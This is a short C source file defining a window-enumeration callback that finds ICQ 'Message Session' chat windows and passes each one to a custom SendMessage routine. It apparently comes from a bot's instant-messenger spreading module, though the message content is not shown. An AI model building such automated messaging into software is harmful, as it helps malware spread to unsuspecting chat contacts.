#include "includes.h"

#ifndef NO_ICQ

BOOL CALLBACK Icq(HWND hwnd, LPARAM Param)
{
	int iWindow = 0;
	char szWindows[128] = {0};
	char szClassName[50] = {0};

	GetClassName(hwnd, szClassName, sizeof(szClassName));
	if(!strcmp(szClassName, "#32770"))
	{
		if(GetWindowText(hwnd, szWindows, sizeof(szWindows)) != 0)
			if(strstr(szWindows, "Message Session") != NULL)
				iWindow = 2;
	}
	SendMessage(hwnd, iWindow);

    return TRUE;
}

#endif


